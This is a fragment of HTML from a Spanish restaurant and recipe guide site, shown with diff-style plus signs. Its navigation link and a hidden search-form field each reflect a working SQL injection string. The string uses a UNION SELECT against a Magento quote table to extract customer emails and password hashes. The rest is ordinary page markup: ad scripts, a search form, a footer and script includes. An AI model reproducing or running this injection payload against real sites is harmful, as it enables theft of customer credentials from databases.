+								<li><a href="ocio.php?seccio=Organismos Oficiales&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Organismos Oficiales</a></li>
+						
+						</div>
+           
+		
+
+			<div class="left" id="main-left">
+
+				<div class="post">
+
+					
+					<div class="post-body">
+
+						
+					</div>
+				
+				</div>
+
+				<div class="content-separator"></div>
+				
+				<div class="box info"><p>
+<!--<a class="ubm-banner" data-id="3"></a>-->
+<!-- 468x60, creado 14/02/09 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:468px;height:60px"
+     data-ad-client="ca-pub-2462719613289084"
+     data-ad-slot="2813391274"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+</p></div>
+<div class='page_heading'><h1>Recetas típicas  - Comidas típicas  - Postres típicos  - Recetas tradicionales </h1><div class="box info"><p>
+<!-- Inicio banner de tradedoubler -->
+<script type="text/javascript">var TDIframe = TDIframe || {counter : 0, newTDId : function(){return 'TDId' + (this.counter += 1);}};TDIframe.url = 'http://anetes.tradedoubler.com/anet-' + Math.random().toString().substring(2, 11) + '?type(iframe)loc(120502)';TDIframe.id = TDIframe.newTDId();document.write('<iframe id="' + TDIframe.id + '" src="" width="468" height="60" frameborder="0" border="0" marginwidth="0" marginheight="0" scrolling="no"></iframe>');document.getElementById(TDIframe.id).src=TDIframe.url;</script>
+<!-- Fin banner tradedoubler -->
+</p></div>
+</div><div class='content-separator'></div><div class="post">
+	<div class="post-body">
+		<form class="yahoo" action="index.php" onsubmit="return buscar()" />
+		<input type="hidden" id="provincia_buscador" name="provincia_buscador" value="Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" />
+		<input type="hidden" id="seccio_buscador" name="seccio_buscador" value="En General" />
+		<input type="hidden" id="provincia_orig_buscador" name="provincia_orig_buscador" value="" />
+		<input type="hidden" id="tabla_buscador" name="tabla_buscador" value="recetario" />
+		<input type="hidden" id="pagina_anterior" name="pagina_anterior" value="/recetasdecocinadetalle.php" />
+		<label>Buscar</label> <input type="text" id="q" name="q" value="" onKeyUp="return buscar()" />
+		<input type="submit" value="Buscar" id="boton" />
+		<span id="loading"></span>
+		</form>
+	</div>
+</div>
+<div id="resultados">
+<p></p>
+</div>						
+					
+				<div class="clearer">&nbsp;</div>
+				
+			</div>
+
+			
+
+		
+		
+<footer id="footer">
+  <div class="container">
+    <div class="row">
+  
+
+<div class="left">&copy; 2016 <a href="http://www.grgastronomia.com">La mejor guía de Restaurantes</a> <span class="text-separator">&rarr;</span> <a href="index.php">Inicio</a> <span class="text-separator">|</span><a href="viajar.php">Guía de uso</a> <span class="text-separator">|</span> <a href="contactanos.php">Contáctanos</a> <span class="text-separator">|</span> <a href="publicidad.php">Publicidad</a> <span class="text-separator">|</span> <a href="quienessomos.php">¿Quiénes somos?</a> <span class="text-separator">|</span> <a href="avisolegal.php">Aviso legal</a> <span class="text-separator">|</span> <a href="form-new-usuario.php">Registrarse</a> <span class="text-separator">|</span> <a href="menu-usuario.php">Menú usuario</a> <span class="text-separator">|</span> <a href="action-newsletter.php?action=baja">Darse de baja</a></div>
+			<div class="right">&nbsp;</div>
+			<div style="width: 100%; text-align: center; float: left;">Diseño y Programación por <a href="http://www.piensavirtual.com" rel="nofollow" target="_blank">Tiendas Online Piensa Virtual</a></div>
+
+			<div class="clearer">&nbsp;</div>
+<p>
+    <a href="http://validator.w3.org/check?uri=referer"><img
+        src="http://www.w3.org/Icons/valid-xhtml10"
+        alt="Valid XHTML 1.0 Transitional" height="31" width="88" /></a>
+  </p>
+
+
+		</div>
+
+	</div>
+</footer>
+<!--
+<script type="text/javascript">
+var infolinks_pid = 463149;
+var infolinks_wsid = 0;
+</script>
+<script type="text/javascript" src="http://resources.infolinks.com/js/infolinks_main.js"></script>
+-->
+
+ <!-- The Scripts -->
+        <script src="js/jquery.min.js"></script>
+        <script src="js/jquery-migrate-1.0.0.js"></script>
+        <script src="js/jquery-ui.js"></script>
+        <script src="js/bootstrap.js"></script>
+        <script src="js/revolution-slider/js/jquery.themepunch.plugins.min.js"></script> 
+        <script src="js/revolution-slider/js/jquery.themepunch.revolution.min.js"></script>
+        <script src="js/jquery.parallax.js"></script>
+        <script src="js/jquery.wait.js"></script>
+        <script src="js/fappear.js"></script> 
+        <script src="js/modernizr-2.6.2.min.js"></script>
+        <script src="js/jquery.bxslider.min.js"></script>
+        <script src="js/jquery.prettyPhoto.js"></script>
+        <script src="js/superfish.js"></script>
+        <script src="js/tweetMachine.js"></script>
+        <script src="js/tytabs.js"></script>
+        <script src="js/jquery.gmap.min.js"></script>
+        <script src="js/jquery.sticky.js"></script>
+        <script src="js/jquery.countTo.js"></script>
+        <script src="js/jflickrfeed.js"></script>
+        <script src="js/imagesloaded.pkgd.min.js"></script>
+        <script src="js/waypoints.min.js"></script>
+        <script src="js/wow.js"></script>
+        <script src="js/jquery.fitvids.js"></script>
+        <script src="js/spectrum.js"></script>
+        <script src="js/switcher.js"></script>
+        <script src="js/custom.js"></script>
+    </body>
+</html>
